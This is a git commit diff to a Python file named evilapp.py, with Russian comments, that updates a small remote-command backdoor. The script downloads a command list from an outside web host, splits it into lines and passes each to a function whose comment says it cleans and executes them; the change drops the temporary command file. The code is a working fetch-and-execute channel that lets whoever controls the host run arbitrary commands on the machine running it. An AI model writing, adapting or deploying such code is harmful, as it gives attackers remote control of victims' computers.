28ab51e6f4df5e3995575dc4dcf746c7da0633ce
0rootlol0 <0rootlol0@gmail.com>
2018-05-15 21:05:27 +0300

    1.1.0

--- evilapp.py
+++ evilapp.py
@@ -8,11 +8,7 @@ import re, os, requests#библеотеки для работы
 
 def get_html(url):#функцыя для скачивания листа с командами
 	r = requests.get(url)#скачивание страницы
-	list1 = open("command.listc",'w')#открытие файла для записи команд
-	list1.write(r.text)#запись страницы С командами
-	list1.close()#закрытие файла
-	lst1 = open("command.listc")#открытие файла для чтения
-	return lst1.readlines()#функция возвращает массив с строками командами
+	return r.text.split("@#@") 
 
 def mission(stur):#функция для очищения команд от спецсимволов и выполнение команд
 	for wew in range(0,len(stur)):#цикл для перебора массива С командами
@@ -21,4 +17,3 @@ def mission(stur):#функция для очищения команд от сп
 
 wer = get_html('https://rstiller.000webhostapp.com/ret.yu')#выполняем функцию в аргументы которые выдаем сайт С командами
 mission(wer)#передача массива на выполнение
-os.remove("command.listc")#удаление файла с командами
